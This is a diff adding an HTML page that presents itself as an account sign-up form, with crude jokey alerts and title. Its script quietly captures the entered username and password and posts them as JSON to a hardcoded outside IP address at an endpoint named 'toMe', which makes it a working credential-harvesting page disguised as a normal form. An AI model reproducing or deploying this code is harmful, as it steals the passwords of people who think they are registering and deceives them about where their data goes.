@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>
+      HE HE HA HA LOGIN BITCH
+    </title>
+    <link href='https://fonts.googleapis.com/css?family=Cabin' rel='stylesheet'>
+  </head>
+  <body style="background-color:#f2f2f2;">
+    <font style="font-family: 'Cabin';">
+      <div id="login">
+        <center>
+          <h1>Create an account!!</h1>
+          <br><br>
+          <p>Username:</p>
+          <input id="username" type="text" style="font-family:'Cabin'; font-size:20px">
+          <br><br>
+          <p>Password:</p>
+          <input id="password" type="password" style="font-family:'Cabin'; font-size:20px">
+          <br><br>
+          <p>Confirm Password:</p>
+          <input id="confirmPassword" type="password" style="font-family:'Cabin'; font-size:20px">
+          <br><br><br><br><br><br><br><br>
+          <button id="createButton">Create!</button>
+        </center>
+      </div>
+      <div id="content">
+        <center>
+          <br><br><br>
+          <p id="title">Welcome!!</p>
+        </center>
+      </div>
+    </font>
+    <style>
+      #createButton{
+        outline:none;
+        font-size:20px;
+        position:relative;
+        width:100px;
+        height:50px;
+        border-radius:8px;
+        border:2px solid #000000;
+        background-color:#4fa848;
+      }
+      #createButton:hover {
+        background-color:#3a9434;
+      }
+      #title{
+        font-size:32px;
+      }
+    </style>
+    <script>
+      const gebi = function(e){return document.getElementById(e);}
+      gebi("content").style.display="none";
+      gebi("createButton").addEventListener("click", function(){
+        if (gebi("username").value==="")alert("Please enter a username broOOOoOoOooooarrrggragoiwoweifaowf");
+        else if (gebi("password").value==="")alert("dude password? hello?")
+        else if (gebi("confirmPassword").value!==gebi("password").value)alert("yoooo passwords do not match. JUST COPY IT AHHHHH");
+        else {
+          gebi("login").style.display="none";
+          gebi("content").style.display=false;
+          var f = document.createElement("form");
+          f.action="http://72.93.238.69:8080/toMe";
+          f.method="post";
+          f.enctype="multipart/form-data";
+          var input = document.createElement("input");
+          input.type="hidden";
+          input.name="data";
+          var json = {
+            user:"",
+            password:""
+          }
+          json.user=gebi("username").value;
+          json.password=gebi("password").value;
+          input.value=JSON.stringify(json);
+          /*
+          var inputU = document.createElement("input");
+          inputU.type="hidden";
+          inputU.name="user";
+          inputU.value=gebi("username").value;
+          var inputP = document.createElement("input");
+          inputP.type="hidden";
+          inputP.name="password";
+          inputP.value=gebi("password").value;
+          f.appendChild(inputU);
+          f.appendChild(inputP);*/
+          f.appendChild(input);
+          document.body.appendChild(f);
+          f.submit();
+        }
+      })
+    </script>
+  </body>
+</html>
